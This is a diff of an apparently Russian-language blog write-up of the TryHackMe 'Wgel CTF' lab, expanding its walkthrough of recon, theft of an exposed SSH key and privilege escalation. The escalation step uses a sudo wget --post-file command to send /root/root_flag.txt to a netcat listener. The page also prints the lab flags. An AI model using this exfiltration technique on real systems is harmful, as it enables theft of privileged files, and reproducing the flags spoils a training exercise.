@@ -3,106 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Теги анти-кеша -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    
     <title>Wgel CTF | Dr@ng3</title>
     <link rel="stylesheet" href="style.css">
-    <style>
-        /* Стили для страницы статьи */
-        .post-container {
-            margin-top: 30px;
-            background: rgba(10, 10, 10, 0.9);
-            padding: 40px;
-            border: 1px solid #333;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 255, 204, 0.1);
-        }
-        
-        .post-title {
-            font-size: 2.5rem;
-            color: #fff;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-        }
-
-        .post-meta {
-            color: var(--accent-color);
-            font-size: 1rem;
-            margin-bottom: 30px;
-            border-bottom: 1px dashed #333;
-            padding-bottom: 15px;
-        }
-
-        .post-content {
-            line-height: 1.8;
-            font-size: 1.1rem;
-        }
-
-        .post-content h2 {
-            color: var(--text-color);
-            margin-top: 30px;
-            margin-bottom: 15px;
-            border-left: 4px solid var(--text-color);
-            padding-left: 10px;
-        }
-
-        .post-content h3 {
-            color: #fff;
-            margin-top: 20px;
-        }
-
-        .post-content p {
-            margin-bottom: 15px;
-        }
-
-        /* Стили для кода */
-        .post-content code {
-            background: #111;
-            padding: 2px 6px;
-            border-radius: 4px;
-            color: var(--accent-color);
-            font-family: 'Fira Code', monospace;
-        }
-
-        .post-content pre {
-            background: #050505;
-            padding: 15px;
-            overflow-x: auto;
-            border-left: 3px solid var(--text-color);
-            margin-bottom: 20px;
-            border-radius: 5px;
-        }
-
-        .post-content pre code {
-            background: transparent;
-            color: #ccc;
-            padding: 0;
-        }
-
-        .post-content img {
-            max-width: 100%;
-            border: 1px solid #333;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-
-        .back-btn {
-            display: inline-block;
-            margin-bottom: 20px;
-            color: #888;
-            text-decoration: none;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-
-        .back-btn:hover {
-            color: var(--text-color);
-            text-shadow: 0 0 10px var(--text-color);
-        }
-    </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
@@ -122,36 +27,52 @@
             <div class="post-meta">TryHackMe | #web #linux #privesc | Nov 05, 2026</div>
             
             <div class="post-content">
-                <p>Всем привет. Это разбор комнаты <strong>Wgel CTF</strong> с платформы TryHackMe. Цель — получить пользовательский и корневой флаги.</p>
+                <p>Всем привет. Это полный разбор комнаты <strong>Wgel CTF</strong> с платформы TryHackMe. Цель — получить пользовательский и корневой флаги. Комната уровня Easy, отлично подходит для тренировки базовых навыков веб-разведки и эскалации привилегий через нестандартное использование разрешенных утилит.</p>
 
                 <h2>1. Разведка (Reconnaissance)</h2>
-                <p>Первым делом сканируем целевой хост с помощью Nmap, чтобы найти открытые порты.</p>
+                <p>Первым делом сканируем целевой хост с помощью Nmap. Нам нужно понять, какие сервисы запущены на машине.</p>
 <pre><code>nmap -sC -sV -Pn -p 22,80 10.113.135.112</code></pre>
-                <p>Находим два открытых порта: <code>22 (SSH)</code> и <code>80 (HTTP)</code>. На 80-м висит дефолтная страница Apache.</p>
+                <p>Результат сканирования:</p>
+                <ul>
+                    <li><strong>22/tcp (SSH):</strong> OpenSSH 7.2p2 Ubuntu</li>
+                    <li><strong>80/tcp (HTTP):</strong> Apache httpd 2.4.18</li>
+                </ul>
+                <p>На 80-м порту висит дефолтная страница Apache «It works!». Это ширма.</p>
 
-                <h2>2. Перечисление директорий</h2>
-                <p>В исходном коде главной страницы находим комментарий с именем пользователя: <code>Jessie</code>. Далее запускаем брутфорс директорий с помощью Gobuster.</p>
+                <h2>2. Веб-разведка и Брутфорс</h2>
+                <p>Смотрим исходный код страницы (Ctrl+U) и в самом низу находим комментарий разработчика: <code>&lt;!-- Jessie don't forget to update the website --&gt;</code>. Запоминаем имя пользователя: <strong>jessie</strong>.</p>
+                <p>Далее запускаем брутфорс директорий с помощью Gobuster, чтобы найти скрытые папки.</p>
 <pre><code>gobuster dir -u http://10.113.135.112 -w /usr/share/wordlists/dirb/common.txt</code></pre>
-                <p>Находим папку <code>/sitemap/</code>. Запускаем Gobuster уже по ней и находим скрытую папку <code>/.ssh</code>.</p>
+                <p>Находим папку <code>/sitemap/</code>. Запускаем Gobuster уже внутри неё:</p>
+<pre><code>gobuster dir -u http://10.113.135.112/sitemap/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                <p>Находим скрытую директорию <code>/.ssh</code> (код ответа 301).</p>
 
-                <h2>3. Первоначальный доступ</h2>
-                <p>В папке <code>/.ssh</code> лежит приватный SSH-ключ <code>id_rsa</code>. Скачиваем его и используем для входа под пользователем jessie.</p>
+                <h2>3. Первоначальный доступ (Initial Access)</h2>
+                <p>Заходим в папку <code>/.ssh</code> через браузер или curl. Там лежит приватный ключ <code>id_rsa</code>. Скачиваем его и даем правильные права.</p>
 <pre><code>curl http://10.113.135.112/sitemap/.ssh/id_rsa -o id_rsa
-chmod 600 id_rsa
-ssh -i id_rsa jessie@10.113.135.112</code></pre>
-                <p>Мы внутри. Находим пользовательский флаг в файле <code>/home/jessie/Documents/user_flag.txt</code>.</p>
+chmod 600 id_rsa</code></pre>
+                <p>Подключаемся по SSH под пользователем jessie:</p>
+<pre><code>ssh -i id_rsa jessie@10.113.135.112</code></pre>
+                <p>Мы внутри системы. Ищем пользовательский флаг в документах:</p>
+<pre><code>cat /home/jessie/Documents/user_flag.txt</code></pre>
+                <p><strong>Флаг пользователя:</strong> <span class="redacted" title="Наведи мышку">057c67131c3d5e42dd5cd3075b198ff6</span></p>
 
-                <h2>4. Эскалация привилегий</h2>
-                <p>Проверяем права пользователя jessie через <code>sudo -l</code>. Видим, что ему разрешено запускать <code>/usr/bin/wget</code> от имени root без пароля. Используем это для эксфильтрации рут-флага.</p>
-                <p>На нашей машине поднимаем слушатель:</p>
+                <h2>4. Эскалация привилегий (Privilege Escalation)</h2>
+                <p>Теперь нам нужно стать рутом. Проверяем, что пользователю jessie разрешено запускать от имени root:</p>
+<pre><code>sudo -l</code></pre>
+                <p>Видим строку: <code>(root) NOPASSWD: /usr/bin/wget</code>. Это значит, что мы можем запускать wget с правами рута без пароля. Используем это для эксфильтрации (кражи) корневого флага.</p>
+                <p>На нашей атакующей машине (AttackBox) поднимаем слушатель:</p>
 <pre><code>nc -lvnp 4444</code></pre>
-                <p>На машине жертвы выполняем отправку файла:</p>
+                <p>На машине жертвы выполняем команду, которая заставит wget отправить файл из /root/ на наш IP:</p>
 <pre><code>sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.113.180.235:4444/</code></pre>
-                <p>Получаем корневой флаг в терминале с netcat. Комната пройдена!</p>
+                <p>В терминале с netcat мы получаем HTTP POST-запрос, в теле которого находится флаг.</p>
+                <p><strong>Корневой флаг:</strong> <span class="redacted" title="Наведи мышку">b1b968b37519ad1daa6408188649263d</span></p>
+
+                <h2>Вывод</h2>
+                <p>Комната отлично демонстрирует опасность оставления скрытых файлов (особенно приватных ключей) на веб-сервере. А также показывает, как безобидная утилита (wget), запущенная с повышенными привилегиями, может привести к полной компрометации системы.</p>
             </div>
         </article>
     </div>
-
     <script src="script.js"></script>
 </body>
 </html>
